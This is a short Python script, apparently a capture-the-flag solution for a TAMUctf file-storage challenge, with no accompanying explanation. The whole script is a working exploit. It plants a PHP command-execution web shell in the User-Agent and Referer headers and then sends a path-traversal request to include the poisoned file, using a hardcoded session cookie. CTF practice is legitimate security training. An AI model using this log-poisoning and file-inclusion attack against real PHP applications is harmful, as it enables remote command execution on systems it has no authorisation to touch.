import requests as req

headers = {
    "User-Agent": "<?php echo exec($_POST[\"file\"]); ?>",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip,deflate",
    "Referer": "http://filestorage.tamuctf.com/index.php?name=<?php echo exec($_POST[\"file\"]); ?>",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID=p4lcl7ughal0m7buvrd74r5kcu"
}

r = req.post("http://filestorage.tamuctf.com/index.php?", params = {"file":"/../../../../../../../bin/echo"}, headers = headers)
print(r.content)
